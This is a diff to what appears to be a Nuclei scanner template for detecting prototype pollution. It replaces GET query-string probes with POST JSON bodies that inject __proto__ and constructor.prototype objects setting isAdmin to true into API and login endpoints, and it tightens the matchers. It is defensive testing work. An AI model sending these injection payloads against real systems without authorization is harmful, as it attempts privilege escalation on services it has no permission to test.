@@ -4,38 +4,44 @@ info:
   name: Prototype Pollution Detection
   author: hunt3r
   severity: medium
-  description: Detects prototype pollution vulnerabilities in JavaScript APIs via __proto__ and constructor.prototype injection.
+  description: Detects prototype pollution via POST body injection, checking for observable behavioral change (isAdmin elevation, hunt3r key echoed in structured response). GET-based reflection tests are excluded to prevent FPs from error messages.
   tags: prototype-pollution,injection,hunt3r
   reference:
     - https://portswigger.net/web-security/prototype-pollution
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/?__proto__[hunt3r]=polluted"
-      - "{{BaseURL}}/?constructor.prototype.hunt3r=polluted"
-      - "{{BaseURL}}/api/products?__proto__[hunt3r]=polluted"
-      - "{{BaseURL}}/rest/products/search?q=test&__proto__[hunt3r]=polluted"
-
-    matchers-condition: or
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "polluted"
-
-      - type: regex
-        part: body
-        regex:
-          - "\"hunt3r\"\\s*:\\s*\"polluted\""
-
+  # POST-based: inject __proto__.isAdmin and check if response reflects the
+  # elevated property — confirms actual prototype chain pollution
   - method: POST
     path:
       - "{{BaseURL}}/api/"
       - "{{BaseURL}}/api/v1/"
       - "{{BaseURL}}/rest/user/login"
 
-    body: '{"__proto__":{"isAdmin":true},"email":"a@b.com","password":"test"}'
+    body: '{"__proto__":{"isAdmin":true,"hunt3r_pp":true},"email":"a@b.com","password":"test"}'
+    headers:
+      Content-Type: "application/json"
+
+    # Must see BOTH a 200 response AND the elevated key in JSON body
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "\"isAdmin\"\\s*:\\s*true"
+          - "\"hunt3r_pp\"\\s*:\\s*true"
+        condition: or
+
+  # constructor.prototype variant — same strict matching requirement
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/"
+      - "{{BaseURL}}/api/v1/"
+
+    body: '{"constructor":{"prototype":{"isAdmin":true,"hunt3r_pp":true}},"email":"a@b.com","password":"test"}'
     headers:
       Content-Type: "application/json"
 
@@ -44,10 +50,9 @@ http:
       - type: status
         status: [200]
 
-      - type: word
+      - type: regex
         part: body
-        words:
-          - "isAdmin"
-          - "admin"
-          - "true"
+        regex:
+          - "\"isAdmin\"\\s*:\\s*true"
+          - "\"hunt3r_pp\"\\s*:\\s*true"
         condition: or
